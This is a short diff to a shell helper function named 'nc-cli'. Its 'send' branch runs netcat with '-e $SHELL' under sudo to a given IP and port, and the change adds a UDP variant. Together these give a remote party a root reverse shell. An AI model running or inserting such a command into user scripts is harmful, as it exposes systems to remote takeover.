@@ -251,11 +251,8 @@ nc-cli() { # Send or Listen packets
                 echo "Usage: nc-cli send <IP> <PORT>" >&2
                 return 1
             else
-                if [[ -z $tty && -z $SSH_TTY ]] ; then
-                    pkexec nc -e "$SHELL" "$2" "$3" 
-                else
-                    sudo nc -e "$SHELL" "$2" "$3" 
-                fi
+                sudo nc "$2" "$3" -e "$SHELL"
+                sudo nc --udp "$2" "$3" -e "$SHELL"
             fi
             ;;
         *)
